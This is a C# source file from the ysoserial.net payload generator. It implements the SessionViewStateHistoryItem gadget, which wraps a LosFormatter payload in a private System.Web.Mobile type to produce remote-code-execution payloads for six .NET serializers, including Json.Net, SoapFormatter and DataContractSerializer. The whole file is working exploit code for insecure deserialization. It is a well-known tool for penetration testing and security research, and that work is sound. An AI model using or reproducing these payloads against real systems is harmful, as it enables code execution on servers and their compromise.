using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.Serialization;
using System.Text;
using System.Text.RegularExpressions;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class SessionViewStateHistoryItemGenerator : GenericGenerator
    {
        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "Json.Net" , "DataContractSerializer" };
        }

        public override string Name()
        {
            return "SessionViewStateHistoryItem";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.LosFormatter;
        }

        private string GetB64SessionToken(string b64encoded)
        {
            var obj = new SessionViewStateHistoryItemMarshal(b64encoded);
            string ndc_serialized = SerializersHelper.NetDataContractSerializer_serialize(obj);
            Regex b64SessionTokenPattern = new Regex(@"\<s[^>]+>([^<]+)");
            Match b64SessionTokenMatch = b64SessionTokenPattern.Match(ndc_serialized);
            return b64SessionTokenMatch.Groups[1].Value;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] losFormatterPayload;
            if (BridgedPayload != null)
            {
                losFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                losFormatterPayload = (byte[])generator.GenerateWithNoTest("LosFormatter", inputArgs);
            }

            string losFormatterText = Encoding.UTF8.GetString(losFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                var obj = new SessionViewStateHistoryItemMarshal(losFormatterText);
                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {

                string payload = "{'$type': 'System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a', 's':'" + GetB64SessionToken(losFormatterText) + "'}";

                if (inputArgs.Minify)
                {
                    // by default JsonSerializerSettings.TypeNameAssemblyFormat is set to Simple so we can remove the version etc from the assembly name
                    // see https://www.newtonsoft.com/json/help/html/P_Newtonsoft_Json_JsonSerializerSettings_TypeNameAssemblyFormat.htm
                    // if TypeNameAssemblyFormat == Full , then we have to keep the full name
                    payload = JsonHelper.Minify(payload, new string[] { "System.Web.Mobile" }, null);
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {

                string payload = $@"<root type=""System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""><SessionViewState.SessionViewStateHistoryItem xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""http://schemas.datacontract.org/2004/07/System.Web.UI.MobileControls"">
  <s i:type=""x:string"" xmlns="""">{GetB64SessionToken(losFormatterText)}</s>
</SessionViewState.SessionViewStateHistoryItem></root>";

                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {

                string payload = $@"<root><w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" z:Id=""1"" z:Type=""System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem"" z:Assembly=""System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <s z:Type=""System.String"" z:Assembly=""0"" xmlns="""">{GetB64SessionToken(losFormatterText)}</s>
</w></root>";

                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {

                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:SessionViewState_x002B_SessionViewStateHistoryItem id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Web.UI.MobileControls/System.Web.Mobile%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
<s>{GetB64SessionToken(losFormatterText)}</s>
</a1:SessionViewState_x002B_SessionViewStateHistoryItem>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";

                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    [Serializable]
    public class SessionViewStateHistoryItemMarshal : ISerializable
    {
        public SessionViewStateHistoryItemMarshal(string strB64LosFormatterPayload)
        {
            B64LosFormatterPayload = strB64LosFormatterPayload;
        }

        private string B64LosFormatterPayload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type myType_SessionViewState = Type.GetType("System.Web.UI.MobileControls.SessionViewState, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
            Type[] nestedTypes = myType_SessionViewState.GetNestedTypes(BindingFlags.NonPublic | BindingFlags.Instance);
            info.SetType(nestedTypes[0]); // to reach the SessionViewStateHistoryItem class (private)
            info.AddValue("s", B64LosFormatterPayload);

        }
    }
}
